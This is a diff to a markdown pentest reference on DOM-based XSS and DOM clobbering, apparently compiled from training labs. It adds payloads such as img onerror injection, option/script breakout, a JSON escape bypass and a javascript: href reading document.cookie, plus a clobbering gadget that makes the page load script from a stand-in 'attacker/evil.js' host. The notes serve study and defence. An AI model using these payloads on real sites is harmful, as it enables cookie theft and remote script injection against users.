@@ -4,7 +4,7 @@ type: technique
 tags: [client-side, dom, exploitation, injection, thm, web, xss]
 phase: exploitation
 date_created: 2026-05-08
-date_updated: 2026-06-18
+date_updated: 2026-09-10
 sources: [thm-adv-dom-attacks, payloadsallthethings-domclobbering, payloadsallthethings-cspt, git-portswigger-all-labs]
 ---
 
@@ -168,34 +168,6 @@ Self-XSS only. To hit other users, deliver via iframe (auto-triggers hashchange)
 <iframe src="https://realwebsite.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
 ```
 
-## DOM Clobbering
-
-When a sink uses a global/property that an attacker can overwrite by injecting named HTML elements, you can hijack JS logic **without running script** - the key bypass for HTML-injection contexts where `<script>`/event handlers are filtered (markdown renderers, sanitized HTML, CSP that blocks inline JS). The DOM exposes named elements as `window.<name>` / `document.<name>`, so injected `id`/`name` attributes "clobber" expected variables.
-
-How the DOM exposes named elements:
-- `<a id=x>` makes `window.x` reference that element; `x.toString()` returns the `href`.
-- Two elements with the same `name`/`id` form an `HTMLCollection`; index or nested `id` to build structure.
-- `<form>` children are reachable as `form.<childname>`.
-
-Common gadget - clobber a config/whitelist global the app trusts:
-```html
-<!-- target: if (window.config && config.url) loadScript(config.url) -->
-<a id=config><a id=config name=url href="https://attacker/evil.js">
-
-<!-- target: var defaultAvatar = window.DEFAULT_AVATAR || '/img/a.png' -->
-<a id=DEFAULT_AVATAR href="cid:javascript:alert(1)">
-```
-
-`document.cookie`/`document.body` clobbering and the `currentScript` trick:
-```html
-<!-- clobber document.getElementById via an <img name=getElementById> in some libs -->
-<img name=getElementById>
-<!-- two-step href via HTMLCollection + form for nested .value/.href -->
-<form id=x><input id=y name=z></form>
-```
-
-DOMPurify-safe HTML still allows clobbering (it permits `id`/`name`), so clobbering is the go-to when XSS is sanitized but the app reads attacker-controlled globals. Hunt: grep client JS for `window.X`/`document.X` reads where `X` is not declared, config objects pulled from `window`, and `||` defaults. Mitigate: explicit `var`/`let` declarations, `Object.freeze` on config, avoid `document.<name>` lookups, sanitizers in `SAFE_FOR_TEMPLATES`/forbid `id`+`name`.
-
 ## DOM XSS via location assignment (Twitter 2010 case study)
 
 Twitter introduced:
@@ -252,9 +224,46 @@ const escapedName = encodeURIComponent(name);
 document.getElementById("greeting").textContent = "Hello, " + escapedName;
 ```
 
+## DOM XSS via innerHTML — `<script>` tags not parsed
+
+`innerHTML` assignment does not execute `<script>` tags; use event-handler tags instead:
+```html
+<img src=x onerror=alert(1) />
+```
+
+## DOM XSS inside `<select>` / `document.write` with option context
+
+Escape the option element then inject:
+```html
+</option><script>alert(1)</script><option selected>
+```
+URL form: `/product?productId=4&storeId=</option><script>alert(1)</script><option%20selected>`
+
+## Reflected DOM XSS — JSON context with backslash escaping
+
+Server escapes `"` to `\"`. Supply `\"` so the server produces `\\"`, which terminates the JSON string:
+```javascript
+\"-alert(1)}//
+```
+Mechanics: server turns `\"` into `\\"` → the `\\` is a literal backslash escape, `"` ends the JSON string, `-alert(1)` executes, `}` closes the object, `//` comments the rest.
+
+## DOM XSS via jQuery href attribute sink
+
+jQuery reads `location.search` and sets an `href` attribute — inject a `javascript:` URI:
+```
+/feedback?returnPath=javascript:alert(document.cookie)
+```
+
 ## DOM Clobbering
 
-DOM clobbering abuses the browser behaviour where named HTML elements (`id`, `name` attributes) are automatically accessible as global variables or properties of `document`. This can overwrite JavaScript variables expected to be objects or functions.
+DOM clobbering abuses the browser behaviour where named HTML elements (`id`, `name` attributes) are automatically accessible as global variables or properties of `document`. This can overwrite JavaScript variables expected to be objects or functions, hijacking JS logic **without running script**: the key bypass for HTML-injection contexts where `<script>`/event handlers are filtered (markdown renderers, sanitised HTML, CSP that blocks inline JS).
+
+How the DOM exposes named elements:
+- `<a id=x>` makes `window.x` reference that element; `x.toString()` returns the `href`.
+- Two elements with the same `name`/`id` form an `HTMLCollection`; index or nested `id` to build structure.
+- `<form>` children are reachable as `form.<childname>`.
+
+Hunt: grep client JS for `window.X`/`document.X` reads where `X` is not declared, config objects pulled from `window`, and `||` defaults. DOMPurify-sanitised HTML still allows clobbering (it permits `id`/`name`); mitigate with explicit `var`/`let` declarations, `Object.freeze` on config objects, and sanitizers configured to forbid `id`+`name` (`SAFE_FOR_TEMPLATES`).
 
 ### Basic DOM clobbering
 
@@ -269,6 +278,21 @@ And the page allows HTML injection (but not direct script execution — e.g., at
 ```
 
 Now `window.admin` is the `<img>` element (truthy), bypassing the check.
+
+### Clobbering a config/whitelist global the app trusts
+
+```html
+<!-- target: if (window.config && config.url) loadScript(config.url) -->
+<a id=config><a id=config name=url href="https://attacker/evil.js">
+```
+
+`document.cookie`/`document.body` clobbering and the `currentScript` trick:
+```html
+<!-- clobber document.getElementById via an <img name=getElementById> in some libs -->
+<img name=getElementById>
+<!-- two-step href via HTMLCollection + form for nested .value/.href -->
+<form id=x><input id=y name=z></form>
+```
 
 ### Clobbering `document.getElementById` results
 
